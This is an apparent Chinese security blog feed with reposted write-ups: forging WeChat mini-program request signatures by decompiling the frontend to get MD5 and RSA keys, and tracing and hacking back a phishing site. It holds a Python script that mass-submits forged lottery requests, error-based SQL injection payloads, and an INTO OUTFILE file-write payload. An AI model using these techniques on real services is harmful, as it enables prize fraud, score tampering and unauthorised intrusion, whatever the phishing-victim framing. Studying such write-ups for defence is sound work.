<p><a href="https://github.com/m4n3dw0lf/PytheM%EF%BC%88Python%E7%BD%91%E7%BB%9C/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7%EF%BC%89">https://github.com/m4n3dw0lf/PytheM（Python网络/渗透测试工具）</a></p>
<p><a href="https://github.com/P0cL4bs/WiFi-Pumpkin%EF%BC%88%E6%97%A0%E7%BA%BF%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%A5%97%E4%BB%B6%EF%BC%89">https://github.com/P0cL4bs/WiFi-Pumpkin（无线安全渗透测试套件）</a></p>
<p><strong>综合类</strong></p>
<p><a href="https://github.com/az0ne/AZScanner">https://github.com/az0ne/AZScanner</a> (自动漏洞扫描器，子域名爆破，端口扫描，目录爆破，常用框架漏洞检测)</p>
<p><a href="https://github.com/blackye/lalascan">https://github.com/blackye/lalascan</a> (自主开发的分布式web漏洞扫描框架，集合owasp top10漏洞扫描和边界资产发现能力)</p>
<p><a href="https://github.com/blackye/BkScanner">https://github.com/blackye/BkScanner</a> (BkScanner 分布式、插件化web漏洞扫描器)</p>
<p><a href="https://github.com/ysrc/GourdScanV2">https://github.com/ysrc/GourdScanV2</a> （被动式漏洞扫描)</p>
<p><a href="https://github.com/alpha1e0/pentestdb">https://github.com/alpha1e0/pentestdb</a> (WEB渗透测试数据库)</p>
<p><a href="https://github.com/netxfly/passive_scan">https://github.com/netxfly/passive_scan</a> (基于http代理的web漏洞扫描器)</p>
<p><a href="https://github.com/1N3/Sn1per">https://github.com/1N3/Sn1per</a> (自动化扫描器，包括中间件扫描以及设备指纹识别)</p>
<p><a href="https://github.com/RASSec/pentestEr_Fully-automatic-scanner">https://github.com/RASSec/pentestEr_Fully-automatic-scanner</a> （定向全自动化渗透测试工具）</p>
<p><a href="https://github.com/3xp10it/3xp10it">https://github.com/3xp10it/3xp10it</a> （3xp10it自动化渗透测试框架）</p>
<p><a href="https://github.com/Lcys/lcyscan%EF%BC%88python%E6%8F%92%E4%BB%B6%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E5%99%A8%EF%BC%89">https://github.com/Lcys/lcyscan（python插件化漏洞扫描器）</a></p>
<p><a href="https://github.com/Xyntax/POC-T%EF%BC%88%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8F%92%E4%BB%B6%E5%8C%96%E5%B9%B6%E5%8F%91%E6%A1%86%E6%9E%B6%EF%BC%89">https://github.com/Xyntax/POC-T（渗透测试插件化并发框架）</a></p>
<p>CTF平台 <a href="http://www.shiyanbar.com/">http://www.shiyanbar.com/</a></p>
<p><a href="http://oj.xctf.org.cn/">http://oj.xctf.org.cn/</a></p>
<p><a href="http://ctf.bugku.com/">http://ctf.bugku.com/</a></p>
<p><a href="http://rookiehacker.org/">http://rookiehacker.org/</a></p>
]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>备忘录</tag>
      </tags>
  </entry>
  <entry>
    <title>绕过接口参数签名验证</title>
    <url>/posts/37c9ac40.html</url>
    <content><![CDATA[<blockquote>
<p>转载自：<a href="https://mp.weixin.qq.com/s/0mIg_Hm7MQ59UmPOspm95A">https://mp.weixin.qq.com/s/0mIg_Hm7MQ59UmPOspm95A</a></p>
<p>编者荐语：渗透手法+1，遇到机会可以尝试一下。</p>
</blockquote>
<p>在一些关键业务接口，系统通常会对请求参数进行签名验证，一旦篡改参数服务端就会提示签名校验失败。在黑盒渗透过程中，如果没办法绕过签名校验，那么就无法进一步深入。</p>
<p>微信小程序的前端代码很容易被反编译，一旦签名加密算法和密钥暴漏，找到参数的排序规则，那么就可以篡改任意数据并根据算法伪造签名。下面我们将通过两个简单的小程序参数签名绕过的案例，来理解签名逆向的过程。</p>
<hr>
<h2 id="01、常见签名算法"><a href="#01、常见签名算法" class="headerlink" title="01、常见签名算法"></a><strong>01、常见签名算法</strong></h2><p>首先呢，我们需要理解的是，加密和签名是两回事，加密是为了防止信息泄露，而签名的目的是防止数据被篡改。</p>
<p>哈希算法的不可逆，以及非对称算法（私钥签名，公钥验签），为签名的实现提供了必要的前提。常见的签名算法，如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MD5、SHA1、SHA256、HMAC-SHA1、HMAC-SHA256、MD5WithRSA、SHA1WithRSA 、SHA256WithRSA等。</span><br></pre></td></tr></table></figure>

<p>各种签名示例如下：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E7%BB%95%E8%BF%87%E6%8E%A5%E5%8F%A3%E5%8F%82%E6%95%B0%E7%AD%BE%E5%90%8D%E9%AA%8C%E8%AF%81/640.png" alt="图片"></p>
<p>可以看到常见的HASH签名算法输出长度是固定的，RSA签名长度取决于密钥大小，输出相对较长。那么，通过签名的字符长度，我们可以简单的判断出系统所使用的签名算法。</p>
<h2 id="02、MD5签名绕过"><a href="#02、MD5签名绕过" class="headerlink" title="02、MD5签名绕过"></a><strong>02、MD5签名绕过</strong></h2><p>业务场景：在一些营销推广的抽奖活动里，关键接口有签名，但没有对单个用户的抽奖次数进行限制。那么，一旦签名算法暴露，将导致用户可以任意构造请求伪造签名，进而在从大量抽奖请求中，提高中奖概率，从而获取到额外的奖品。</p>
<p>（1）通过模拟器获取小程序的.wxapkg包</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E7%BB%95%E8%BF%87%E6%8E%A5%E5%8F%A3%E5%8F%82%E6%95%B0%E7%AD%BE%E5%90%8D%E9%AA%8C%E8%AF%81/640-1660013723481116.png" alt="图片"></p>
<p>（2）使用反编译脚本解包，获取小程序前端源码。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E7%BB%95%E8%BF%87%E6%8E%A5%E5%8F%A3%E5%8F%82%E6%95%B0%E7%AD%BE%E5%90%8D%E9%AA%8C%E8%AF%81/640-1660013723482117.png" alt="图片"></p>
<p><strong>（3）全局搜索关键字sign，获取签名算法，session+timestamp计算md5，然后md5+nonce重新生成签名。</strong></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E7%BB%95%E8%BF%87%E6%8E%A5%E5%8F%A3%E5%8F%82%E6%95%B0%E7%AD%BE%E5%90%8D%E9%AA%8C%E8%AF%81/640-1660013723482118.png" alt="图片"></p>
<p><strong>（4）编写Python脚本，仿写签名机制，模拟进行大批量的抽奖请求，部分代码如下:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#部分代码</span><br><span class="line">    timestamp =int(round((time.time()) * 1000))</span><br><span class="line">    nonce = &#x27;&#x27;.join(random.sample(&#x27;ABCDEFGHJKMNPQRSTWXYZabcdefhijkmnprstwxyz123456789&#x27;,16))</span><br><span class="line">    hash1=hashlib.md5((session3rd+str(timestamp)).encode(&#x27;utf8&#x27;)).hexdigest()</span><br><span class="line">    sign=hashlib.md5((hash1+nonce).encode(&#x27;utf8&#x27;)).hexdigest()</span><br><span class="line">    headers=&#123;&#x27;User-Agent&#x27;:&#x27;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0&#x27;,</span><br><span class="line">             &#x27;content-type&#x27;: &#x27;application/x-www-form-urlencoded&#x27;,</span><br><span class="line">             &#x27;timestamp&#x27;:str(timestamp),</span><br><span class="line">             &#x27;nonce&#x27;:nonce,</span><br><span class="line">             &#x27;sign&#x27;:sign,</span><br><span class="line">            &#125;</span><br><span class="line">    r = requests.post(url,data=payload,headers=headers,verify=False,allow_redirects=False)</span><br></pre></td></tr></table></figure>

<p><strong>（5）从批量的抽奖请求中，获取优惠券或实物奖品。</strong></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E7%BB%95%E8%BF%87%E6%8E%A5%E5%8F%A3%E5%8F%82%E6%95%B0%E7%AD%BE%E5%90%8D%E9%AA%8C%E8%AF%81/640-1660013723482119.png" alt="图片"></p>
<h2 id="03、RSA签名绕过"><a href="#03、RSA签名绕过" class="headerlink" title="03、RSA签名绕过"></a><strong>03、RSA签名绕过</strong></h2><p>业务场景：在一些微信小程序游戏的场景里，用户在游戏结束的时候，需要将游戏成绩发送到后端，以此来记录玩家的分数。</p>
<p>因调用API时对请求参数进行签名验证，服务器会对该请求参数进行验证是否合法，所以当我们尝试去篡改游戏成绩的时候，就会提示签名异常。那么，该如何破局呢？</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E7%BB%95%E8%BF%87%E6%8E%A5%E5%8F%A3%E5%8F%82%E6%95%B0%E7%AD%BE%E5%90%8D%E9%AA%8C%E8%AF%81/640-1660013723482120.png" alt="图片"></p>
<p>（1）微信小程序反编译解包</p>
<p>使用模拟器获取微信小程序的.wxapkg包</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E7%BB%95%E8%BF%87%E6%8E%A5%E5%8F%A3%E5%8F%82%E6%95%B0%E7%AD%BE%E5%90%8D%E9%AA%8C%E8%AF%81/640-1660013723483121.png" alt="图片"></p>
<p>使用反编译脚本解包，获取小程序前端源码。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E7%BB%95%E8%BF%87%E6%8E%A5%E5%8F%A3%E5%8F%82%E6%95%B0%E7%AD%BE%E5%90%8D%E9%AA%8C%E8%AF%81/640-1660013723483122.png" alt="图片"></p>
<p>（2）逆向破解小程序参数签名</p>
<p>将小程序的前端代码复制到本地，Sign值比较长，盲猜RSA签名算法，全局搜索关键字，因关键js代码未作混淆加密，很容易就获取到了RSA签名算法和私钥。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E7%BB%95%E8%BF%87%E6%8E%A5%E5%8F%A3%E5%8F%82%E6%95%B0%E7%AD%BE%E5%90%8D%E9%AA%8C%E8%AF%81/640-1660013723483123.png" alt="图片"></p>
<p>最常见的是根据参数名称将所有请求参数按ASCII码排序，而在这里我们很容易地就可以从前端代码里获取到参数顺序。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E7%BB%95%E8%BF%87%E6%8E%A5%E5%8F%A3%E5%8F%82%E6%95%B0%E7%AD%BE%E5%90%8D%E9%AA%8C%E8%AF%81/640-1660013723483124.png" alt="图片"></p>
<p>（3）基于jsrsasign的rsa签名验签，尝试篡改请求参数，构建签名计算Sign值。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E7%BB%95%E8%BF%87%E6%8E%A5%E5%8F%A3%E5%8F%82%E6%95%B0%E7%AD%BE%E5%90%8D%E9%AA%8C%E8%AF%81/640-1660013884779137.png" alt="图片"></p>
<p>构建http数据包，成功伪造签名篡改游戏成绩。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E7%BB%95%E8%BF%87%E6%8E%A5%E5%8F%A3%E5%8F%82%E6%95%B0%E7%AD%BE%E5%90%8D%E9%AA%8C%E8%AF%81/640-1660013723483125.png" alt="图片"></p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>微信小程序</tag>
      </tags>
  </entry>
  <entry>
    <title>记一次曲折的钓鱼溯源反制</title>
    <url>/posts/a3fc7ed3.html</url>
    <content><![CDATA[<blockquote>
<p>转载自：<a href="https://xz.aliyun.com/t/11471">https://xz.aliyun.com/t/11471</a></p>
<p>作者：小艾</p>
<p>编者荐语：</p>
<p>本篇内容涵盖：钓鱼、溯源、反制、目录扫描、子域名扫描、源代码泄露、getshell、msf提权、宝塔、阿里云AccessKey泄露利用。基本覆盖了一整套渗透流程，过程也遇到了许多曲折。</p>
<p>编者补充：</p>
<p>溯源到了qq号码，q主设置了不可通过搜索来查找此qq号码，我们可以通过访问qq空间的方式来进行绕过，链接为：</p>
<p><a href="https://user.qzone.qq.com/qq%E5%8F%B7%E7%A0%81?source=friendlist">https://user.qzone.qq.com/qq号码?source=friendlist</a></p>
<p>访问之后，可以到自己的空间查看访问记录，然后添加好友。</p>
</blockquote>
<h3 id="故事起因"><a href="#故事起因" class="headerlink" title="故事起因"></a>故事起因</h3><p>这天风和日丽，我正在摸鱼，忽然QQ群弹出一条消息，我打开一看，我感觉不简单。如下图：</p>
<p><a href="https://wiki-oss.s3.cn-north-1.jdcloud-oss.com/2022/06/ca2ae8b562fe0a9fa86dd3e1da3bc024.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://wiki-oss.s3.cn-north-1.jdcloud-oss.com/2022/06/ca2ae8b562fe0a9fa86dd3e1da3bc024.png" alt="img"></a></p>
<p>扫码后发现跳转到了QQ邮箱登陆界面，确定为钓鱼网站，看到其域名为<a href="http://****kak2.cn./">http:&#x2F;&#x2F;****kak2.cn。</a></p>
<p><a href="https://wiki-oss.s3.cn-north-1.jdcloud-oss.com/2022/06/b410e87002e048e2bb46b3a93a15ccce.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://wiki-oss.s3.cn-north-1.jdcloud-oss.com/2022/06/b410e87002e048e2bb46b3a93a15ccce.png" alt="img"></a></p>
<p>这里随便输入，页面跳转到如下界面。</p>
<p><a href="https://wiki-oss.s3.cn-north-1.jdcloud-oss.com/2022/06/9f6ef7b8395353c1f53ea744a50b8946.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://wiki-oss.s3.cn-north-1.jdcloud-oss.com/2022/06/9f6ef7b8395353c1f53ea744a50b8946.png" alt="img"></a></p>
<p>好家伙，小伙子你挺会玩啊，收集完QQ邮箱账号密码，再来收集一波个人信息，做人不能太贪心啊。开始干活！</p>
<h3 id="溯源钓鱼者"><a href="#溯源钓鱼者" class="headerlink" title="溯源钓鱼者"></a>溯源钓鱼者</h3><p>我们现在拿到了他的域名，现在收集一下域名的相关信息。使用站长工具，如下图。</p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20220623094621-485ef7d0-f296-1.jpg"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://xzfile.aliyuncs.com/media/upload/picture/20220623094621-485ef7d0-f296-1.jpg" alt="img"></a></p>
<p>可以查到域名注册人的姓名和邮箱。邮箱显示不全，这里再通过微步来进行一下查询。如下图</p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20220623094429-056b67b0-f296-1.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://xzfile.aliyuncs.com/media/upload/picture/20220623094429-056b67b0-f296-1.png" alt="img"></a></p>
<p>这里有两点可以关注一下，这里拿到了完整的邮箱和知道了这里是阿里云的。</p>
<p>进行一下邮箱反查，发现该邮箱下在五六月份注册多个域名，姓名都是刘xx，大概率都是用来钓鱼的。</p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20220623094512-1f8289b2-f296-1.jpg"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://xzfile.aliyuncs.com/media/upload/picture/20220623094512-1f8289b2-f296-1.jpg" alt="img"></a></p>
<p>尝试添加QQ，发现查不到这个人，这就尴尬了。</p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20220623094723-6d896c48-f296-1.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://xzfile.aliyuncs.com/media/upload/picture/20220623094723-6d896c48-f296-1.png" alt="img"></a></p>
<p>关于钓鱼者的信息收集就告一段落，接下来开始干它网站。</p>
<h3 id="进攻钓鱼网站"><a href="#进攻钓鱼网站" class="headerlink" title="进攻钓鱼网站"></a>进攻钓鱼网站</h3><p>之前我们拿到了域名，现在对网站进行渗透，那思路是什么呢？我们可以进行一下子域名、目录等扫描，如果没什么信息，那就开始对钓鱼网站本身看看有没有能利用的地方。</p>
<p>首先进行一下子域名扫描，没什么发现，如下图：</p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20220623094742-78900e76-f296-1.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://xzfile.aliyuncs.com/media/upload/picture/20220623094742-78900e76-f296-1.png" alt="img"></a></p>
<p>然后开始对域名进行一下目录扫描，如下图</p>
<p><a href="https://wiki-oss.s3.cn-north-1.jdcloud-oss.com/2022/06/941f18863b564ac3ac422da20a9a2812.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://wiki-oss.s3.cn-north-1.jdcloud-oss.com/2022/06/941f18863b564ac3ac422da20a9a2812.png" alt="img"></a></p>
<p>扫出来的目录，基本没有权限，都是403。没什么利用的点。</p>
<p>现在看来只能对网站本身进行一下渗透了，看看有没有能够利用的。现在打开收集个人信息的表单，按F12看看有没有我们值得关注的，如下：</p>
<p><a href="https://wiki-oss.s3.cn-north-1.jdcloud-oss.com/2022/06/0c6c7ed584ebb84afee6dac76fe41b64.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://wiki-oss.s3.cn-north-1.jdcloud-oss.com/2022/06/0c6c7ed584ebb84afee6dac76fe41b64.png" alt="img"></a></p>
<p>之前目录扫描发现了uploads目录但是没有权限，这里找到了uploads&#x2F;ads路径，尝试一下这里路径后端是否接收文件，构造上传数据包，发送数据，还是失败了。如下：</p>
<p><a href="https://wiki-oss.s3.cn-north-1.jdcloud-oss.com/2022/06/e3a102f99aeb804af2e49cf8259d9157.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://wiki-oss.s3.cn-north-1.jdcloud-oss.com/2022/06/e3a102f99aeb804af2e49cf8259d9157.png" alt="img"></a></p>
<p>不要灰心，接着搞，我们还发现这里使用了form表单提交数据，然后自定义了一个函数chk()，现在我们跟进这个函数去看一眼。如下</p>
<p><a href="https://wiki-oss.s3.cn-north-1.jdcloud-oss.com/2022/06/4ea6bf887c862428de73f65b21efe79e.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://wiki-oss.s3.cn-north-1.jdcloud-oss.com/2022/06/4ea6bf887c862428de73f65b21efe79e.png" alt="img"></a></p>
<p>在这里我们能够了解到，网站使用了ajax来进行数据传输，将数据提交到了本站的wap目录，然后身份证号码进行了一下简单的正则判断，规定输入为数字且位数为18位。既然是将数据提交到本站了，<strong>那么如果钓鱼者再后端接收数据时直接将参数拼接到SQL语句中，那么就可能存在SQL注入。</strong>现在我们构造数据，提交数据，然后抓取数据包来进行测试，抓取的数据包如下：</p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20220623094830-954aaa76-f296-1.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://xzfile.aliyuncs.com/media/upload/picture/20220623094830-954aaa76-f296-1.png" alt="img"></a></p>
<p>接下来开始测试是否存在SQL注入，name参数后添加单引号，发送数据，发现报错，存在SQL注入！</p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20220623094850-a162b01a-f296-1.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://xzfile.aliyuncs.com/media/upload/picture/20220623094850-a162b01a-f296-1.png" alt="img"></a></p>
<p>猜解一下数据库名，数据库版本，构造payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; and updatexml(1,concat(0x7e,(select database()),0x7e),1)%23</span><br><span class="line">and updatexml(1,concat(0x7e,(select @@version,0x7e),1)%23</span><br></pre></td></tr></table></figure>

<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20220623095235-2793a572-f297-1.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://xzfile.aliyuncs.com/media/upload/picture/20220623095235-2793a572-f297-1.png" alt="img"></a></p>
<p>数据库名是a7，猜解一下表名，构造payload如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&#x27;a7&#x27;)),0)%23</span><br></pre></td></tr></table></figure>

<p>发现无法获取表名，我有一种不详的预感。</p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20220623095048-e796b8a6-f296-1.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://xzfile.aliyuncs.com/media/upload/picture/20220623095048-e796b8a6-f296-1.png" alt="img"></a></p>
<p>果然换用一些其他的函数，发现也是无法获取表名，可能是没有权限。真让人伤心，这个老六。</p>
<p>现在用sqlmap跑一下吧，结果如下</p>
<p><a href="https://wiki-oss.s3.cn-north-1.jdcloud-oss.com/2022/06/b6a7ee50f04f3cace2bccc43333d5e6a.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://wiki-oss.s3.cn-north-1.jdcloud-oss.com/2022/06/b6a7ee50f04f3cace2bccc43333d5e6a.png" alt="img"></a></p>
<p>只能跑出来a7这个数据库，information_schema这个库获取不到，怪不得手工注入也拿不到表名呢。唉，现在尝试一下os-shell吧，看看有没有运气。如下</p>
<p><a href="https://wiki-oss.s3.cn-north-1.jdcloud-oss.com/2022/06/cd4f7cac6621ad623c6ef171e97b5f75.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://wiki-oss.s3.cn-north-1.jdcloud-oss.com/2022/06/cd4f7cac6621ad623c6ef171e97b5f75.png" alt="img"></a></p>
<p>看来运气并不好，失败了。不过，虽然失败了，但是我们也知道了现在的服务器系统为Linux，并且有了路径，我们就把它当成绝对路径吧，死马当活马医，看看能不能写入文件，构造payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">into outfile &#x27;\\www\\wwwroot\\p******7.a******ka.cn\\config\\wap\\test.php&#x27; FIELDS TERMINATED BY &#x27;&lt;?php phpinfo();?&gt;&#x27;%23</span><br></pre></td></tr></table></figure>

<p>结果如下，还是失败了。</p>
<p>又尝试了一些其他的方法，发现收获不大。</p>
<h3 id="峰回路转"><a href="#峰回路转" class="headerlink" title="峰回路转"></a>峰回路转</h3><p>真的拿不下它服务器了吗？我不信，晚上的时候，事情迎来了转机，当时我正在划水，一条好友申请打破了平静，当我同意时，大哥人狠话不多，直接URL和账号密码发了过来，包括源码的压缩包也扫出来了。在这里给大师傅递根烟。</p>
<p><a href="https://wiki-oss.s3.cn-north-1.jdcloud-oss.com/2022/06/c27aa39158fbcb59a7b895f7bbc076ee.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://wiki-oss.s3.cn-north-1.jdcloud-oss.com/2022/06/c27aa39158fbcb59a7b895f7bbc076ee.png" alt="img"></a></p>
<p>这里大师傅也给我宽展了思路，扫目录的时候多尝试几个工具，可能会有不一样的惊喜。访问url使用账号密码登陆，界面如下。</p>
<p><a href="https://wiki-oss.s3.cn-north-1.jdcloud-oss.com/2022/06/b624f942b2c94d85807072ba2535653f.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://wiki-oss.s3.cn-north-1.jdcloud-oss.com/2022/06/b624f942b2c94d85807072ba2535653f.png" alt="img"></a></p>
<p>登陆后，我们发现，这是一个帝国备份王的一个开源CMS。当我们知道是开源的时候，首先的思路是网上有没有一些公开的漏洞供我们使用。比如我们可以这样搜索 <strong>EmpireBak v2010 后台 RCE</strong>，结果如下</p>
<p><a href="https://wiki-oss.s3.cn-north-1.jdcloud-oss.com/2022/06/494892ffac9630947e05c1568f3cfd30.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://wiki-oss.s3.cn-north-1.jdcloud-oss.com/2022/06/494892ffac9630947e05c1568f3cfd30.png" alt="img"></a></p>
<p>红箭头指的这篇文章就很合适，通过看文章，<strong>我们也了解了getshell的思路，就是替换文件内容。具体流程就是我们可以先备份数据，然后点击管理备份目录，点击替换文件内容。</strong></p>
<p>思路是有了，但是现在还有问题，就是备份王链接不上mysql，导致备份功能无法使用，但是不着急，这里备份王提供了一个功能，就是参数设置。如下</p>
<p><a href="https://wiki-oss.s3.cn-north-1.jdcloud-oss.com/2022/06/1b0b4b2ccbaad18f20422fdbf34b99b3.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://wiki-oss.s3.cn-north-1.jdcloud-oss.com/2022/06/1b0b4b2ccbaad18f20422fdbf34b99b3.png" alt="img"></a></p>
<p>如果我们知道了数据库的账号密码和数据库名，是不是就可以尝试连接数据库了。所以现在重点是获取数据库账号密码。这如何获取呢？不要忘记了，之前我们拿到了钓鱼网站的源码压缩包，现在来解压来分析一下源码。找一找配置文件，可能有我们需要的信息。源码目录如下</p>
<p><a href="https://wiki-oss.s3.cn-north-1.jdcloud-oss.com/2022/06/a4eda0053231f7c30048bfbb122301d9.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://wiki-oss.s3.cn-north-1.jdcloud-oss.com/2022/06/a4eda0053231f7c30048bfbb122301d9.png" alt="img"></a></p>
<p>现在尝试找一下数据库的配置文件，如下，果然拿到的我们想要的信息</p>
<p><a href="https://wiki-oss.s3.cn-north-1.jdcloud-oss.com/2022/06/14f05ce3aa748b48ed37df43be1360dc.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://wiki-oss.s3.cn-north-1.jdcloud-oss.com/2022/06/14f05ce3aa748b48ed37df43be1360dc.png" alt="img"></a></p>
<p>现在去网站尝试一下看看是否连接成功，果然不出所料，连接成功，如下</p>
<p><a href="https://wiki-oss.s3.cn-north-1.jdcloud-oss.com/2022/06/a207d09d11ead1d45824a22d4865a87b.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://wiki-oss.s3.cn-north-1.jdcloud-oss.com/2022/06/a207d09d11ead1d45824a22d4865a87b.png" alt="img"></a></p>
<p>现在可以尝试拿shell了。喝口水压压惊，和大师傅同步一下信息，一个人孤军奋战，怎么能抵得上两个人一起日站的快乐呢。</p>
<p><a href="https://wiki-oss.s3.cn-north-1.jdcloud-oss.com/2022/06/f75bca67a07837db1ef2488d684e3b17.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://wiki-oss.s3.cn-north-1.jdcloud-oss.com/2022/06/f75bca67a07837db1ef2488d684e3b17.png" alt="img"></a></p>
<h3 id="进后台"><a href="#进后台" class="headerlink" title="进后台"></a>进后台</h3><p>之前咱们看源码，发现有一个a1文件夹，查看文件夹相关文件，知道这是后台的路径</p>
